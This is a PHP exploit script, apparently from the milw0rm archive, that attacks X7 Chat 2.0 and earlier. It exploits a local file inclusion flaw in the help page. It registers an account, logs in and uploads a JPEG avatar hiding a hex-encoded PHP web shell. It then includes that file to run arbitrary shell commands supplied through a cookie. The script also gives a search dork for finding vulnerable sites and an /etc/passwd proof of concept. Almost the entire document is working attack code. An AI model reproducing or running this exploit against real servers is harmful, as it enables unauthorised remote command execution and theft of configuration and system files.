#!/usr/bin/php -q -d short_open_tag=on
<?
echo "X7 Chat <=2.0 \"help_file\" arbitrary local inclusion\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n";
echo "-> works regardless of magic_quotes_gpc settings\r\n";
echo "   if avatar uploads are enabled (default)\r\n";
echo "dork: intitle:\"X7 Chat Help Center\" | \"Powered By X7 Chat\"\r\n\r\n";

if ($argc<4) {
echo "Usage: php ".$argv[0]." host path cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to X7\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /X7/ cat ./../config.php\r\n";
echo "php ".$argv[0]." localhost /X7/ ls -la -p81\r\n";
echo "php ".$argv[0]." localhost / ls -la -P1.1.1.1:80\r\n";
die;
}

/*
 software site: http://www.x7chat.com/
 description: "X7 Chat is free, open source, software written in PHP"

 vulnerable code in help/index.php at lines 32-37:

 ...
 if(!isset($_GET['help_file']) || !@is_file("./{$_GET['help_file']}")){
		$_GET['help_file'] = "main";
	}

	// Load the help definitions
	include("./{$_GET['help_file']}");
...

so, you can view/include all files on target system, poc:

http://[target]/[path]/help/index.php?help_file=../../../../../../etc/passwd

this tool upload an avatar with php code as EXIF metadata content, then:

http://[target]/[path]/help/index.php?help_file=../uploads/avatar_[username].jpeg&cmd=ls%20-la
									      */

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

function make_seed()
{
   list($usec, $sec) = explode(' ', microtime());
   return (float) $sec + ((float) $usec * 100000);
}


$host=$argv[1];
$path=$argv[2];
$cmd="";$port=80;$proxy="";

for ($i=3; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$cmd=urlencode($cmd);
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

srand(make_seed());
$v = rand(1,99);

echo "step 1 -> register...\r\n";
$data="username=suntzu".$v;
$data.="&pass1=suntzu";
$data.="&pass2=suntzu";
$data.="&email=suntzu".$v."@hotmail.com";
$packet ="POST ".$p."index.php?act=register&step=1 HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
#debug
#echo quick_dump($packet);
sendpacketii($packet);

echo "step 2 -> login...\r\n";
$data="dologin=dologin";
$data.="&username=suntzu".$v;
$data.="&password=suntzu";
$packet="POST ".$p."index.php HTTP/1.0\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
#debug
#echo quick_dump($packet);
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$temp2=explode(" ",$temp[1]);$cookie=$temp2[0];
$temp2=explode(" ",$temp[2]);$cookie.=" ".$temp2[0];
if ($cookie=="") {die("Failed to login...\r\n");}
echo "Cookie -> ".$cookie."\r\n";
echo "step 3 -> upload an avatar...\r\n";
$shell=
chr(0xff).chr(0xd8).chr(0xff).chr(0xfe).chr(0x00).chr(0xcf).chr(0x3c).chr(0x3f).
chr(0x70).chr(0x68).chr(0x70).chr(0x0d).chr(0x0a).chr(0x69).chr(0x66).chr(0x20).
chr(0x28).chr(0x67).chr(0x65).chr(0x74).chr(0x5f).chr(0x6d).chr(0x61).chr(0x67).
chr(0x69).chr(0x63).chr(0x5f).chr(0x71).chr(0x75).chr(0x6f).chr(0x74).chr(0x65).
chr(0x73).chr(0x5f).chr(0x67).chr(0x70).chr(0x63).chr(0x28).chr(0x29).chr(0x29).
chr(0x7b).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).
chr(0x45).chr(0x5b).chr(0x27).chr(0x63).chr(0x6d).chr(0x64).chr(0x27).chr(0x5d).
chr(0x3d).chr(0x73).chr(0x74).chr(0x72).chr(0x69).chr(0x70).chr(0x73).chr(0x6c).
chr(0x61).chr(0x73).chr(0x68).chr(0x65).chr(0x73).chr(0x28).chr(0x24).chr(0x5f).
chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).chr(0x45).chr(0x5b).chr(0x27).
chr(0x63).chr(0x6d).chr(0x64).chr(0x27).chr(0x5d).chr(0x29).chr(0x3b).chr(0x7d).
chr(0x0d).chr(0x0a).chr(0x65).chr(0x72).chr(0x72).chr(0x6f).chr(0x72).chr(0x5f).
chr(0x72).chr(0x65).chr(0x70).chr(0x6f).chr(0x72).chr(0x74).chr(0x69).chr(0x6e).
chr(0x67).chr(0x28).chr(0x30).chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x69).
chr(0x6e).chr(0x69).chr(0x5f).chr(0x73).chr(0x65).chr(0x74).chr(0x28).chr(0x22).
chr(0x6d).chr(0x61).chr(0x78).chr(0x5f).chr(0x65).chr(0x78).chr(0x65).chr(0x63).
chr(0x75).chr(0x74).chr(0x69).chr(0x6f).chr(0x6e).chr(0x5f).chr(0x74).chr(0x69).
chr(0x6d).chr(0x65).chr(0x22).chr(0x2c).chr(0x30).chr(0x29).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).chr(0x20).chr(0x22).chr(0x35).
chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x22).chr(0x3b).chr(0x0d).chr(0x0a).
chr(0x70).chr(0x61).chr(0x73).chr(0x73).chr(0x74).chr(0x68).chr(0x72).chr(0x75).
chr(0x28).chr(0x24).chr(0x5f).chr(0x43).chr(0x4f).chr(0x4f).chr(0x4b).chr(0x49).
chr(0x45).chr(0x5b).chr(0x22).chr(0x63).chr(0x6d).chr(0x64).chr(0x22).chr(0x5d).
chr(0x29).chr(0x3b).chr(0x0d).chr(0x0a).chr(0x65).chr(0x63).chr(0x68).chr(0x6f).
chr(0x20).chr(0x22).chr(0x35).chr(0x36).chr(0x37).chr(0x38).chr(0x39).chr(0x22).
chr(0x3b).chr(0x0d).chr(0x0a).chr(0x64).chr(0x69).chr(0x65).chr(0x3b).chr(0x0d).
chr(0x0a).chr(0x3f).chr(0x3e).chr(0xff).chr(0xe0).chr(0x00).chr(0x10).chr(0x4a).
chr(0x46).chr(0x49).chr(0x46).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x00).
chr(0x48).chr(0x00).chr(0x48).chr(0x00).chr(0x00).chr(0xff).chr(0xdb).chr(0x00).
chr(0x43).chr(0x00).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0xff).chr(0xdb).chr(0x00).chr(0x43).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).
chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0x01).chr(0xff).
chr(0xc0).chr(0x00).chr(0x11).chr(0x08).chr(0x00).chr(0x01).chr(0x00).chr(0x01).
chr(0x03).chr(0x01).chr(0x11).chr(0x00).chr(0x02).chr(0x11).chr(0x01).chr(0x03).
chr(0x11).chr(0x01).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x00).chr(0x01).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x09).
chr(0xff).chr(0xc4).chr(0x00).chr(0x14).chr(0x10).chr(0x01).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0xff).chr(0xc4).
chr(0x00).chr(0x14).chr(0x01).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x06).chr(0xff).chr(0xc4).chr(0x00).chr(0x14).
chr(0x11).chr(0x01).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).chr(0x00).
chr(0x00).chr(0x00).chr(0xff).chr(0xda).chr(0x00).chr(0x0c).chr(0x03).chr(0x01).
chr(0x00).chr(0x02).chr(0x11).chr(0x03).chr(0x11).chr(0x00).chr(0x3f).chr(0x00).
chr(0x3f).chr(0xc1).chr(0xc7).chr(0xdf).chr(0xff).chr(0xd9).chr(0x00).chr(0x00);

$data='-----------------------------7d63ba6e09fc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

5242880
-----------------------------7d63ba6e09fc
Content-Disposition: form-data; name="avatar"; filename="whatever.jpg"
Content-Type: image/jpeg

'.$shell.'
-----------------------------7d63ba6e09fc--
';

echo "step 4 -> launch commands...\r\n";
$packet="POST ".$p."index.php?act=usercp&cp_page=upload&uploaded=1 HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d63ba6e09fc\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
#debug
#echo quick_dump($packet);
sendpacketii($packet);

$path_to_shell=urlencode("../uploads/avatar_suntzu".$v.".jpeg");
$packet ="GET ".$p."help/index.php?help_file=".$path_to_shell." HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd."\r\n";
$packet.="Connection: Close\r\n\r\n";
#debug
#echo quick_dump($packet);
sendpacketii($packet);
if (strstr($html,"56789"))
  {
    echo "Exploit succeeded...\r\n\r\n";
    $temp=explode("56789",$html);
    echo $temp[1];
    die;
  }
//if you are here...
echo "Exploit failed...";
?>

# milw0rm.com [2006-05-02]